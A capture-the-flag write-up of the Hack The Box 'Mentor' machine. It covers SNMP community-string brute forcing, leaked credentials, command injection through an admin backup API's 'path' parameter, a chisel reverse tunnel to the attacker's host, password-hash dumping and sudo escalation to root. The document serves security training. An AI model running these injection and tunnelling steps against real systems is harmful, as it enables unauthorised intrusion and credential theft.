---
description: This is the write of mentor machine in hackthebox.
---

# Mentor \[HTB-MEDIUM]

<figure><img src="../.gitbook/assets/Mentor.png" alt=""><figcaption><p>Banner</p></figcaption></figure>

## ENUMERATION:

### PORT SCAN&#x20;

#### TCP

{% code lineNumbers="true" %}
```bash
hax-13@ZARB:~/Documents/ctfs/htb/medium/Mentor-10.10.11.193$ sudo nmap -sC -sV -p- --min-rate 2000 mentorquotes.htb -oN nmap/tcp.txt
[sudo] password for hax-13: 
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-10 09:32 PKT
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.37s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.0.3 Python/3.6.9
|_http-title: MentorQuotes
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.66 seconds

```
{% endcode %}

#### UDP SCAN TOP 200.

{% code lineNumbers="true" %}
```bash
hax-13@ZARB:~/Documents/ctfs/htb/medium/Mentor-10.10.11.193$ sudo nmap -sU -p 1-200 mentorquotes.htb -oN nmap/udp-200
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-10 09:46 PKT
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.21s latency).
Not shown: 198 closed ports
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp

Nmap done: 1 IP address (1 host up) scanned in 211.02 seconds
```
{% endcode %}

### Port 80 - HTTP (Apache)

Let's visit the port 80 and see what are we up against.&#x20;

<figure><img src="../.gitbook/assets/Pasted image 20230110095029.png" alt=""><figcaption></figcaption></figure>

There is not much here to see and to test for. Let's Run a directory scan.

#### Directory Scan:

{% code lineNumbers="true" %}
```bash
hax-13@ZARB:~/Documents/ctfs/htb/medium/Mentor-10.10.11.193$ cat ffuf/main-domain-directory-medium.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://mentorquotes.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

# directory-list-2.3-medium.txt [Status: 200, Size: 5505, Words: 1618, Lines: 167]
#                       [Status: 200, Size: 5505, Words: 1618, Lines: 167]
#                       [Status: 200, Size: 5505, Words: 1618, Lines: 167]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 5505, Words: 1618, Lines: 167]
                        [Status: 200, Size: 5505, Words: 1618, Lines: 167]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 5505, Words: 1618, Lines: 167]
# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 5505, Words: 1618, Lines: 167]
#                       [Status: 200, Size: 5505, Words: 1618, Lines: 167]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 5505, Words: 1618, Lines: 167]
# on at least 2 different hosts [Status: 200, Size: 5505, Words: 1618, Lines: 167]
# Copyright 2007 James Fisher [Status: 200, Size: 5505, Words: 1618, Lines: 167]
#                       [Status: 200, Size: 5505, Words: 1618, Lines: 167]
# This work is licensed under the Creative Commons [Status: 200, Size: 5505, Words: 1618, Lines: 167]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 5505, Words: 1618, Lines: 167]
                        [Status: 200, Size: 5505, Words: 1618, Lines: 167]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10]bash
```
{% endcode %}

We couldnot find anything intresting as well . So let's run a scan for virtual hosts.

#### Virtual Host:

{% code lineNumbers="true" %}
```bash

wfuzz -H "Host: FUZZ.mentorquotes.htb" --hc 302,400 -t 50 -c -z file,"/opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt" http://mentorquotes.htb/

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mentorquotes.htb/
Total requests: 38267

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                          
=====================================================================

000000142:   404        0 L      2 W        22 Ch       "api"                                                                                                            


```
{% endcode %}

We found a `api.mentorquotes.htb` let's add this to our hosts file.

<figure><img src="../.gitbook/assets/Pasted image 20230110152255.png" alt=""><figcaption><p>api.mentorquotes.htb</p></figcaption></figure>

Let's do some directory busting and see if we can find some intresting endpoints.

```bash
hax-13@ZARB:~/Documents/ctfs/htb/medium/Mentor-10.10.11.193$ ffuf -u http://api.mentorquotes.htb/FUZZ -w /opt/wordlist/SecLists/Discovery/Web-Content/common.txt | tee ffuf/api-mentor-common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://api.mentorquotes.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/wordlist/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

admin                   [Status: 307, Size: 0, Words: 1, Lines: 1]
docs                    [Status: 200, Size: 969, Words: 194, Lines: 31]
quotes                  [Status: 307, Size: 0, Words: 1, Lines: 1]
server-status           [Status: 403, Size: 285, Words: 20, Lines: 10]
users                   [Status: 307, Size: 0, Words: 1, Lines: 1]
:: Progress: [4713/4713] :: Job [1/1] :: 168 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

Let's visit and see what we can find.

<figure><img src="../.gitbook/assets/Pasted image 20230110152834.png" alt=""><figcaption><p>API DOCUMENTATION</p></figcaption></figure>

### Tech Profile:

<figure><img src="../.gitbook/assets/Pasted image 20230110094501.png" alt=""><figcaption><p>Wappalyzer</p></figcaption></figure>

The application is built in python and flask.

### **Create a New User:**

Let's use signup endpoint to create a new user.

We can create new users using 2 ways.

<figure><img src="../.gitbook/assets/Pasted image 20230110153428.png" alt=""><figcaption><p>Ways</p></figcaption></figure>

> Using Curl

Just copy the requet and paste it in terminal.

> Using Burp

1. Just copy the url and open it in a new tab.
2. Intercept the request
3. Change request methood.
4. Change Content-Type to `aplication\json`
5. add Body and send.

<figure><img src="../.gitbook/assets/Pasted image 20230110153956.png" alt=""><figcaption></figcaption></figure>

### LOGIN

Lets Login With Our New Account but hitting `/auth/login` endpoint.

<figure><img src="../.gitbook/assets/Pasted image 20230110160337.png" alt=""><figcaption><p>JWT</p></figcaption></figure>

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QxMjMiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ.GQr-2RtHL4iJBe9iJpcrwQ759j0NF8mgvEzeDYgMaFo`

Found a email of james `james@mentorquotes.htb`.

> Get Users

1. Get the request link
2. Intercept the request
3. Add Authorization header

<figure><img src="../.gitbook/assets/Pasted image 20230110160813.png" alt=""><figcaption><p>ADMIN CAN ACESS DATA</p></figcaption></figure>

Let's Ananlysze the JWT TOKEN. \[Nothing vulnerable]

After bumping my head for so many hours. I quited.

But after few hours tried to enumerate the udp scan and found a snmp port open. So let's Enumerate it.

### SNMP ENUMERATION:

#### **Step 1**:

FIND COMMUNITY STRINGS.\`

```bash
hax-13@ZARB:/opt/Tools$ python3 snmpbrute.py --file=/opt/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt  --bruteonly -t 10.10.11.193 
   _____ _   ____  _______     ____             __     
  / ___// | / /  |/  / __ \   / __ )_______  __/ /____ 
  \__ \/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \
 ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/ 

SNMP Bruteforce & Enumeration Script v2.0
http://www.secforce.com / nikos.vassakis <at> secforce.com
###############################################################

Trying ['public', 'private', '0', '0392a0', '1234', '2read', '4changes', 'ANYCOM', 'Admin', 'C0de', 'CISCO', 'CR52401', 'IBM', 'ILMI', 'Intermec', 'NoGaH$@!', 'OrigEquipMfr', 'PRIVATE', 'PUBLIC', 'Private', 'Public', 'SECRET', 'SECURITY', 'SNMP', 'SNMP_trap', 'SUN', 'SWITCH', 'SYSTEM', 'Secret', 'Security', 'Switch', 'System', 'TENmanUFactOryP', 'TEST', 'access', 'adm', 'admin', 'agent', 'agent_steal', 'all', 'all private', 'all public', 'apc', 'bintec', 'blue', 'c', 'cable-d', 'canon_admin', 'cc', 'cisco', 'community', 'core', 'debug', 'default', 'dilbert', 'enable', 'field', 'field-service', 'freekevin', 'fubar', 'guest', 'hello', 'hp_admin', 'ibm', 'ilmi', 'intermec', 'internal', 'l2', 'l3', 'manager', 'mngt', 'monitor', 'netman', 'network', 'none', 'openview', 'pass', 'password', 'pr1v4t3', 'proxy', 'publ1c', 'read', 'read-only', 'read-write', 'readwrite', 'red', 'regional', 'rmon', 'rmon_admin', 'ro', 'root', 'router', 'rw', 'rwa', 'san-fran', 'sanfran', 'scotty', 'secret', 'security', 'seri', 'snmp', 'snmpd', 'snmptrap', 'solaris', 'sun', 'superuser', 'switch', 'system', 'tech', 'test', 'test2', 'tiv0li', 'tivoli', 'trap', 'world', 'write', 'xyzzy', 'yellow'] community strings ...
10.10.11.193 : 161 	Version (v1):	public
10.10.11.193 : 161 	Version (v2c):	public
10.10.11.193 : 161 	Version (v2c):	internal
Waiting for late packets (CTRL+C to stop)

Trying identified strings for READ-WRITE ...

Identified Community strings
	0) 10.10.11.193    public (v1)(RO)
	1) 10.10.11.193    public (v2c)(RO)
	2) 10.10.11.193    internal (v2c)(RO)
Finished!
```

Now we have a community strings let's retrieve data using `smbbulkwalk`.

#### **STEP 2:**

Let's retrieve data using smbbulkwalk.

```bash
snmpbulkwalk -Cr1000  -v 2c -c public 10.10.11.193 | tee exploit/snmp-public.txt
```

Lets analyse it manullay.

> LEAD

<figure><img src="../.gitbook/assets/Pasted image 20230110201947.png" alt=""><figcaption><p>creds</p></figcaption></figure>

```bash
hax-13@ZARB:~/Documents/ctfs/htb/medium/Mentor-10.10.11.193/exploit$ cat snmp-internal.txt |grep login
iso.3.6.1.2.1.25.4.2.1.2.908 = STRING: "systemd-logind"
iso.3.6.1.2.1.25.4.2.1.2.1697 = STRING: "login.sh"
iso.3.6.1.2.1.25.4.2.1.2.2127 = STRING: "login.py"
iso.3.6.1.2.1.25.4.2.1.4.908 = STRING: "/lib/systemd/systemd-logind"
iso.3.6.1.2.1.25.4.2.1.5.1697 = STRING: "/usr/local/bin/login.sh"
iso.3.6.1.2.1.25.4.2.1.5.2127 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
iso.3.6.1.2.1.25.6.3.1.2.478 = STRING: "login_1:4.8.1-2ubuntu2.1_amd64"
```

> Tried them on ssh \[Didn't Work]

```bash
hax-13@ZARB:~/Documents/ctfs/htb/medium/Mentor-10.10.11.193/exploit$ ssh james@mentorquotes.htb 
The authenticity of host 'mentorquotes.htb (10.10.11.193)' can't be established.
ED25519 key fingerprint is SHA256:fkqwgXFJ5spB0IsQCmw4K5HTzEPyM27mczyMp6Qct5Q.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'mentorquotes.htb' (ED25519) to the list of known hosts.
james@mentorquotes.htb's password: 
Permission denied, please try again.
james@mentorquotes.htb's password: 
Permission denied, please try again.
james@mentorquotes.htb's password: 
james@mentorquotes.htb: Permission denied (publickey,password).

```

> Authorize using these credentials.

<figure><img src="../.gitbook/assets/Pasted image 20230110202744.png" alt=""><figcaption><p>ADMIN JWT</p></figcaption></figure>

```bash
POST /auth/login HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 104

{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "kj23sadkj123as0-d213"
}
```

`Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0`&#x20;

<figure><img src="../.gitbook/assets/Pasted image 20230110203028.png" alt=""><figcaption><p>Details</p></figcaption></figure>

We also have an admin page on the `api.mentorquotes.htb`.

> ADMIN PAGE

<figure><img src="../.gitbook/assets/Pasted image 20230111092840.png" alt=""><figcaption><p>admin</p></figcaption></figure>

Let's check those functions:

1. /check \[NOT IMPLEMENTED YET]
2. /backup function takes 2 parameters 'body' and 'path' json format.

<figure><img src="../.gitbook/assets/Pasted image 20230111093911.png" alt=""><figcaption></figcaption></figure>

These types of parameters are mostly vulnerable to sql injections or command execution vulnerabilities. The body parameter contains the data that should be sored and the path parameter should be the location of where to store it. The body parameter should be tested for sql and path shoul be tested for RCE. So Let's test em.

> RCE POC IN PATH PARAMETER.

ADD `ping -c 4 <ip>` in the path parameter and send the request.

<figure><img src="../.gitbook/assets/Pasted image 20230111100812.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Pasted image 20230111100925.png" alt=""><figcaption><p>Ping Back</p></figcaption></figure>

We can see we received some pings back. so let's get a foothold.

## FOOT HOLD\[Docker]

<figure><img src="../.gitbook/assets/Pasted image 20230111101242.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Pasted image 20230111101353.png" alt=""><figcaption></figcaption></figure>

looks like we have a docker contatiner. So lets if is we find anything.

Let's discuss how we got RCE and do some source code analysis. A vulnerability existed in api domain with /admin/backup function. So Let's see it.

```python
/app/app/api # cat admin.py
from fastapi import APIRouter, Depends
from app.api.utils import is_admin, is_logged
from app.api.models import backup
import os

router = APIRouter()

WORK_DIR = os.getenv('WORK_DIR', '/app')
DATABASE_URL = os.getenv('DATABASE_URL', 'postgresql://postgres:postgres@192.168.1.4/hello_fastapi_dev')

@router.get('/', dependencies=[Depends(is_logged), Depends(is_admin)],include_in_schema=False)
async def admin_funcs():
    return {"admin_funcs":{"check db connection":"/check","backup the application": "/backup"}}

@router.get('/check',dependencies=[Depends(is_logged), Depends(is_admin)],include_in_schema=False)
async def check_connection():
    return {"details": "Not implemented yet!"}


# Take a backup of the application
@router.post("/backup",dependencies=[Depends(is_logged), Depends(is_admin)],include_in_schema=False)
async def backup(payload: backup):
    os.system(f'tar -c -f {str(payload.path)}/app_backkup.tar {str(WORK_DIR)} &')
    return {"INFO": "Done!"}

```

The backup function doesnot sanitize the input as the application trusts the admin to have access, so if an attacker could get admin privellegs he would be able to run anything as a command.

`tar -c -f <attacker's command> / app_backup.tar /path/to/WORK_DIR &`

```bash
hax-13@ZARB:/opt/Tools$ tar -c -f `/tmp;sleep 4`
bash: /tmp: Is a directory
tar: option requires an argument -- 'f'
Try 'tar --help' or 'tar --usage' for more information.
```

This would result in delay of 4 seconds, just run the command in your own terminal. That's how we got RCE on the system.

## PRIVILLEGE ESCALATION\[SVC]:

After analyzing source code, found some information about database.

After analysing source code, found some information about database.

```python
# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
```

The databse is running on host system. So its port number will not be found by linpeas. So found the portnumber used by postgress is `5432`. So Lets Port Forward this portnumber.

`./chisel client -v 10.10.16.15:6543 R:5433:172.22.0.1:5432`

```bash
/tmp # ./chisel client -v 10.10.16.15:6543 R:5433:172.22.0.1:5432
2023/01/11 09:17:21 client: Connecting to ws://10.10.16.15:6543
2023/01/11 09:17:23 client: Handshaking...
2023/01/11 09:17:26 client: Sending config
2023/01/11 09:17:26 client: Connected (Latency 307.731348ms)
2023/01/11 09:17:26 client: tun: SSH connected

```

```bash
hax-13@ZARB:~/Documents/ctfs/htb/medium/Mentor-10.10.11.193$ psql -h 127.0.0.1 -p 5433 -d mentorquotes_db -U postgres
Password for user postgres: 
psql (14.5 (Ubuntu 14.5-0ubuntu0.22.04.1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

mentorquotes_db-# \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)

mentorquotes_db-# select * from users;
ERROR:  syntax error at or near "?"
LINE 1: ?
        ^
mentorquotes_db=# select * from users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
(2 rows)

mentorquotes_db=# 

```

> Break Hashes

<figure><img src="../.gitbook/assets/Pasted image 20230111142535.png" alt=""><figcaption></figcaption></figure>

`123meunomeeivani`

We can login using these credentials.

## PREVILLEGE ESCALATION\[James]:

After running linpeas found snmp configuration file. Which can contain sensitive information like passwords etc. So after trying different methoods, I decided to check them.

```bash
╔══════════╣ Analyzing SNMP Files (limit 70)
-rw-r--r-- 1 root root 3453 Jun  5  2022 /etc/snmp/snmpd.conf
# rocommunity: a SNMPv1/SNMPv2c read-only access community name
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
-rw------- 1 Debian-snmp Debian-snmp 1268 Jan 11 13:43 /var/lib/snmp/snmpd.conf

```

Let's check them.

```bash
# include a all *.conf files in a directory
includeDir /etc/snmp/snmpd.conf.d


createUser bootstrap MD5 SuperSecurePassword123__ DES [Password]
rouser bootstrap priv

com2sec AllUser default internal
group AllGroup v2c AllUser
#view SystemView included .1.3.6.1.2.1.1
view SystemView included .1.3.6.1.2.1.25.1.1
view AllView included .1
access AllGroup "" any noauth exact AllView none none

```

Found a password. let's try it.

```bash
svc@mentor:/tmp$ su james 
Password: 
james@mentor:/tmp$ 
james@mentor:/tmp$ 
```

## PRIVILEGE ESCALATION \[ROOT]

After running linpeas found that james id able to run all the root commands using sh.

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh

```

So we can just escalate our privelleges using small command like `sudo sh` and now we are root.

```bash
james@mentor:/tmp$ sudo sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
logins.log  root.txt  scripts  snap
# cat root.txt
26cfd40d713b1ce510863d56afff25c5
# 

```

Now we have rooted the box.

Now we have root privilege's on the box. Hope you liked it. Follow me on [Twitter](https://twitter.com/Mujahid\_Hashar).
